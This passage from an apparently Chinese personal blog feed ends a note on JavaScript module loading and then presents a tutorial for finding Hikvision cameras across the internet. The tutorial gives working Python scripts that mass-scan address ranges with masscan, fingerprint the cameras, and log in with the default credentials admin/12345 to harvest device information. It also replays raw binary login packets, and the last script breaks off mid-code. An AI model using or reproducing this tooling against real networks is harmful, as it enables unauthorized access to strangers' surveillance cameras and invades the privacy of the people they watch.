class="function"><span class="keyword">function</span>(<span class="params">mod</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!mod.loaded)</span><br><span class="line">            <span class="comment">// 如果模块还没加载把父模块的whenDepsLoaded保存</span></span><br><span class="line">            <span class="comment">// 留待该模块完成以后调用</span></span><br><span class="line">            mod.onLoad.push(whenDepsLoaded);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">whenDepsLoaded</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//如果依赖没有全加载好，值得一提的是[].every总是返回真</span></span><br><span class="line">        <span class="keyword">if</span> (!deps.every(<span class="function"><span class="keyword">function</span>(<span class="params">m</span>) </span>&#123; <span class="keyword">return</span> m.loaded; &#125;))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 如果依赖都下载完成，如果deps为[]，args=[]</span></span><br><span class="line">        <span class="keyword">var</span> args = deps.map(<span class="function"><span class="keyword">function</span>(<span class="params">m</span>) </span>&#123; <span class="keyword">return</span> m.exports; &#125;);</span><br><span class="line">        <span class="keyword">var</span> exports = moduleFunction.apply(<span class="literal">null</span>, args);</span><br><span class="line">        <span class="keyword">if</span> (myMod) &#123;    <span class="comment">//对当前模块对象进行更新</span></span><br><span class="line">            myMod.exports = exports;</span><br><span class="line">            <span class="comment">// 更新当前模块状态</span></span><br><span class="line">            myMod.loaded = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//当前模块完成时都会调用一次依赖它的模块们的whenDepsLoaded函数</span></span><br><span class="line">            myMod.onLoad.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123; f(); &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    whenDepsLoaded();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果就是:</p>
<ol>
<li><p>首先调用顶级define，define中所有依赖调用getModule去下载被依赖者代码,被依赖者的代码下载完成后会执行下一个define。</p>
</li>
<li><p>define中getModule会立即返回一个对象，这个对象保存想要加载的被依赖模块的导出接口、是否完成加载信息，和依赖它的模块的whenDepsLoaded函数。</p>
</li>
<li><p>该模块调用其whenDepsLoade函数，该函数在依赖没有全加载完时立即返回。</p>
</li>
<li><p>接下来就等待被依赖模块下载好，被依赖函数又是一个define函数。define函数重复上述过程，</p>
</li>
<li><p>此递归过程继续。直到某个没有依赖的模块</p>
</li>
<li><p>对没有依赖的模块，define中直接调用whenDepsLoaded函数，更新它的导出接口，更新它的加载状态，调用依赖它的模块的whenDepsLoaded函数。(注意js的函数作用域中的myMod)</p>
</li>
<li><p>该whenDepsLoaded函数保存了它自身的模块名和信息。如果它还有其它依赖没加载，立即返回。直到它所有依赖的模块的状态都变了，它的whenDepsLoaded函数才从此真正有了实质作用。把加载好的被依赖模块作为参数，开始真正执行模块代码(之前早就下载好的define的一部分)。之后更新它的导出接口、更新它的加载状态，调用依赖它的模块的whenDepsLoaded函数。</p>
</li>
<li><p>被依赖的模块完成后又重复过程7，不断调用更高级别的依赖者的whenDepsLoaded函数，直到所有的函数都执行完。顶级的define中的whenDepsLoaded执行完。</p>
</li>
</ol>
<p>著名的<a href="http://requirejs.org" target="_blank" rel="external">require.js</a>的设计就是这个原理。</p>
<p>我的逻辑性有点浆糊，但我觉得每种情况都说明白了，没有依赖，依赖其它，不被依赖的模块。</p>
<h2 id="接口设计原则">接口设计原则</h2><ol>
<li>可预测：不总做出乎意料的设计。</li>
<li>组件化：尽可能功能通用，提供简单的数据结构和语法。</li>
<li>分层设计：暴露不同程度的细节。</li>
</ol>
<p>综上，这都是些原理和基本原则。实际会涉及很多复杂的问题。不过，万丈高楼平地起，浮沙之上无高台，基础是深入的前提。而这个前提确是：万事开头难。</p>
<p>感谢看完的读者，希望以后碰到模块化问题都能更轻松迅速解决。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>eloquent javascript是一本浸润着黑客精神和文化的书，上一次看到这样的书还是在三年前，那本书叫land of lisp。</p>
<p>这是关于eloquent js第十章，模块化的一些解释。因为我觉得这部分不好理解。</p>
<h2 id="js模块化基础]]>
    </summary>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="javascript" scheme="http://reverland.org/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python Spider: 海康威视摄像头发现]]></title>
    <link href="http://reverland.org/python/2015/04/07/python-spider-camera-find/"/>
    <id>http://reverland.org/python/2015/04/07/python-spider-camera-find/</id>
    <published>2015-04-06T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.555Z</updated>
    <content type="html"><![CDATA[<h2 id="Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)">Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)</h2><blockquote>
<p>一切都在不可避免的走向庸俗</p>
<p>王小波</p>
</blockquote>
<p>挖坟= =and 最后一个爬虫。</p>
<p>缘起在去年，一个去某阿里的我并不认识的毕业师兄，这个毕业的师兄好像还写了北邮人ip到地址插件，这个师兄在毕业的时候发了一些列摆一摆贵邮的各种安全问题，其中有个摄像头默认用户名密码。结果呢，我就没登录进去那几个摄像头= =</p>
<p>警告：你所做的一切都是有迹可寻的，dont be evil。</p>
<p>我这里只举摄像头的例子。其实能做的很多，ssh服务器，ftp、数据库等等。如果对web安全漏洞比较熟悉，拿到互联网上批量挖掘都行。。。好像不是在讲爬虫了，不过我觉得爬虫就是爬取信息的工具。</p>
<p>顺便一提，最近分析了下阿里的社会招聘，顺便画了下据此得到的阿里架构图，有兴趣的同学可以一起玩.</p>
<p>大概这么几步：</p>
<ol>
<li>用高效的扫描器扫描大范围地址段，得到开放端口80的ip列表，最好还是随机而不是顺序排列的</li>
<li>对地址大海中聊若晨星般的ip进行http请求，获取服务器信息，保存下来。</li>
<li>找到某种摄像头信息的“基因”(即，这种摄像头必然返回这种信息而其它服务器不会),这里只举一个简单例子</li>
<li>批量获取弱密码摄像头</li>
</ol>
<p>首先，我们需要在unix下工作。。。我们需要辅助工具。我这里说下为什么会使用<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">masscan</a>，因为他比我自己写的扫描器比<a href="https://zmap.io" target="_blank" rel="external">zmap</a>、nmap更快，快很多，虽然它们各有所长。python这里又做起了胶水语言的勾当= =</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">扫描指定端口</span><br><span class="line">usage:</span><br><span class="line">    python scan_port.py net interface port</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> popen2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.makedirs(<span class="string">'data/open_port/'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.mkdir(<span class="string">'dump'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 扫描网段内80端口, 生成列表</span></span><br><span class="line">cmd = <span class="string">"sudo masscan -i"</span> + sys.argv[<span class="number">2</span>] + \</span><br><span class="line">    <span class="string">" -p "</span> + sys.argv[<span class="number">3</span>] + <span class="string">" --rate 100000 --wait 2 -oL data/open_port/open"</span> + \</span><br><span class="line">    sys.argv[<span class="number">3</span>] + <span class="string">"_ip.temp "</span> + \</span><br><span class="line">    sys.argv[<span class="number">1</span>] + <span class="string">" &amp;&amp;\</span><br><span class="line">    cut -f4 -d' ' data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + \</span><br><span class="line">    <span class="string">"_ip.temp &gt; data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + <span class="string">"_ip.list &amp;&amp;\</span><br><span class="line">    rm -f data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + <span class="string">"_ip.temp"</span></span><br><span class="line"><span class="keyword">print</span> cmd</span><br><span class="line"><span class="comment"># cmd = "sudo zmap -i " + sys.argv[2]  + \</span></span><br><span class="line"><span class="comment">#    " -p " + sys.argv[3] + " -o open" + sys.argv[3] + \</span></span><br><span class="line"><span class="comment">#    "_ip.list " + sys.argv[1]</span></span><br><span class="line"></span><br><span class="line">(child_stdout, child_stdin) = popen2.popen2(cmd, bufsize=-<span class="number">1</span>, mode=<span class="string">'t'</span>)</span><br><span class="line"><span class="comment"># 打印输出</span></span><br><span class="line">sys.stdout.write(child_stdout.read())</span><br></pre></td></tr></table></figure>
<p>是不是看上去特别奇葩，我把这种奇(zuo)葩(si)的行事方式叫做quick and dirty式，除了确实能用没有其它优点了(ゝ∀･)</p>
<p>速度很快，这已经到我无线上行的顶峰了，旁边打游戏的同学不要打我ლ(╹◡╹ლ)。喝杯水，看会有爱的<a href="http://eloquentjavascript.net/09_regexp.html" target="_blank" rel="external">eloquent javascript</a>，设定下终端静默时提醒，嗯，好像终端提醒这种神器只有<a href="https://yakuake.kde.org" target="_blank" rel="external">yakuake</a>会有~^_^~</p>
<p><img src="/images/spider/net_scan_1.png" alt=""></p>
<p>我们接下来要处理下这些开放80端口的ip，我们把开放80端口的服务器都模拟请求一次，这样就获得每个ip对应的服务器信息。<a href="https://github.com/robertdavidgraham/masscan/search?utf8=%E2%9C%93&amp;q=HTTP%2FGET+" target="_blank" rel="external">其实这一步我们可以改masscan源码，这样上一步扫描的时候就能把服务器返回信息返回，我们愉快的解析成想要的格式就行</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">获取server dict</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">20</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/open_port/open80_ip.list'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ips = f.readlines()</span><br><span class="line"></span><br><span class="line">ips = [ip.strip() <span class="keyword">for</span> ip <span class="keyword">in</span> ips]</span><br><span class="line"><span class="comment"># 移除开头和结尾的无关信息</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    ips.remove(<span class="string">'#masscan'</span>)</span><br><span class="line">    <span class="comment"># ips.remove('# end')</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ips.remove(<span class="string">'saddr'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    ips.remove(<span class="string">''</span>)</span><br><span class="line"><span class="comment"># 保存80端口响应</span></span><br><span class="line">server_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_service</span><span class="params">(ip)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"test"</span>, ip</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.get(<span class="string">'http://'</span> + ip,</span><br><span class="line">                  verify=<span class="keyword">False</span>,</span><br><span class="line">                  allow_redirects=<span class="keyword">True</span>,</span><br><span class="line">                  timeout=<span class="number">20</span>)</span><br><span class="line">        server_dict[ip] = r</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">30</span>)</span><br><span class="line">pool.join(timeout=<span class="number">20</span>)</span><br><span class="line">pool.map(check_service, ips)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Dumping port-80 response..."</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(server_dict, f)</span><br></pre></td></tr></table></figure>
<p>好吧，monkey_patch,gevent这点非常适合这种quick&amp;dirty的脏活累活，就像我常做的事情。。。</p>
<p><img src="/images/spider/net_scan_2.png" alt=""></p>
<p>gevent是啥呢？不知道的自己谷歌吧，我也不知道是啥，据说是对libev的封装，据说是协程、据说是yield，据说yield是好像操作系统完成一次任务切换，据说操作系统任务切换在x86下要靠TSS，据说…</p>
<p>总之，你阻塞的每次请求变成了可以并发的请求。这里的坑我不想说，因为我不懂= =，但你可以自己试试不用gevent的版本。</p>
<p>另外，这里会比masscan慢上无数倍，masscan用用户态的网络栈来实现无状态了，我们这里则是用着系统提供的网络栈。</p>
<p>接下来，该看看怎么获取某种摄像头的“基因”并且批量登录了，这之前已经提到过，用浏览器检查整个过程。找到其特点。</p>
<p><img src="/images/spider/net_scan_3.png" alt=""></p>
<p>我觉得这东西就是其特点了<span>´ ▽ ` )ﾉ</span></p>
<p>对符合特点的ip地址，我们不妨试着登录下。果然跳转到另一个页面了。分析下如何登录的吧</p>
<p>这种默认用户名密码上网一搜就搜到了= =</p>
<p><img src="/images/spider/net_scan_4.png" alt=""></p>
<p><img src="/images/spider/net_scan_5.png" alt=""></p>
<p>同理，我们可以找到设备信息的地址。万事具备，只剩代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">获取摄像头信息框架</span><br><span class="line">输入：</span><br><span class="line">- 特征字符串</span><br><span class="line">- 获取信息方法。同步/异步</span><br><span class="line">输出：</span><br><span class="line">编号文件camera_num</span><br><span class="line">id:name:username:password</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">100</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server_dict = pickle.load(f)</span><br><span class="line"><span class="comment"># Hikvision: 可登录验证</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hikvision IP Camera found:"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Username: admin"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Password: 12345"</span></span><br><span class="line">t_1 = &#123;&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-"</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> server_dict.iteritems():</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>].content.find(<span class="string">'doc/page/login.asp'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> x[<span class="number">0</span>]</span><br><span class="line">        t_1[x[<span class="number">0</span>]] = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取第一种设备信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">device_info</span><span class="params">(ip)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.auth = (<span class="string">'admin'</span>, <span class="string">'12345'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.get(<span class="string">'http://'</span> + ip + <span class="string">'/PSIA/System/deviceInfo'</span>)</span><br><span class="line">        <span class="keyword">if</span> r.ok:</span><br><span class="line">            t_1[ip] = r.content</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s.get(<span class="string">'http://'</span> + ip + <span class="string">'/ISAPI/System/deviceInfo'</span>)</span><br><span class="line">            <span class="keyword">if</span> r.ok:</span><br><span class="line">                t_1[ip] = r.content</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        t_1[ip] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">300</span>)</span><br><span class="line">pool.join(timeout=<span class="number">100</span>)</span><br><span class="line">pool.map(device_info, [ip <span class="keyword">for</span> ip <span class="keyword">in</span> t_1.keys()])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Dumping type 1 devices info"</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./dump/camera/t_1.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(t_1, f)</span><br></pre></td></tr></table></figure>
<p><img src="/images/spider/net_scan_6.png" alt=""></p>
<p>获取的设备信息是xml格式的，我们可以自由的利用python的xml库进行解析，进行数据分析等等。</p>
<p>另外，有很多摄像头要求浏览器安装自己的浏览器activex插件，我们可以用wireshark或类似东西抓下包，找到其相关信息的位置，然后猜测解析协议。比如，另一种摄像头</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">t_2</span><br><span class="line">OCX</span><br><span class="line">"""</span></span><br><span class="line"><span class="comment"># <span class="doctag">FIXME:</span> 经常失败？</span></span><br><span class="line"><span class="comment"># 目前想法是控制timeout</span></span><br><span class="line"><span class="comment"># 多次请求后成功率变高？</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">2</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server_dict = pickle.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find IP Camera Type 2"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hikvision IP Camera found:(ObjectX, check disabled)"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Username: admin"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Password: 12345"</span></span><br><span class="line">t_2 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> server_dict.iteritems():</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>].content.find(<span class="string">'NetOCX'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        t_2[x[<span class="number">0</span>]] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">print</span> x[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取第二种设备信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">device_info</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"test "</span>, ip</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">        s.send(<span class="string">"\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00(\xc1\x00\x00\x00\x00\x0f\x02\x00\n\x08\x00';Je\x00\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">        data = s.recv(<span class="number">1024</span>)</span><br><span class="line">        login_rt = <span class="string">"\x00\x00\x00L'\x00\x00\x00\x00\x00\x00'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">if</span> data != login_rt:</span><br><span class="line">            t_2[ip] = <span class="string">''</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 首先是个seq</span></span><br><span class="line">            <span class="comment"># 可能无效包，但测试必须有后面才正常</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">                seq_req = <span class="string">"\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x00(\xc1\x00\x00\x00\x00\x0f\x02\x00\n\x08\x00';Je\x00\x00z\xdaf\x00\x8d\x16\xd2~\x9dU\x05\xf1\x1fi\xbb\xa9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc3\xd0\xa2|\xa6v\xbd\xf3\x1eO\xd1\xcb\xdc\xae\xcbd"</span></span><br><span class="line">                s.send(seq_req)</span><br><span class="line">                seq_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">del</span> seq_ret</span><br><span class="line">                s.close()</span><br><span class="line">            <span class="comment"># 然后是name_seq</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            name_seq_req = <span class="string">"\x00\x00\x00 Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00"</span></span><br><span class="line">            s.send(name_seq_req)</span><br><span class="line">            name_seq_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># print "name_seq_ret: ", name_seq_ret</span></span><br><span class="line">            s.close()</span><br><span class="line">            <span class="comment"># 其次是chanel</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            chanel_req = <span class="string">"\x00\x00\x00$Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x022\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00\x00\x00\x00\x01"</span></span><br><span class="line">            s.send(chanel_req)</span><br><span class="line">            chanel_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># print "Chanle_ret: 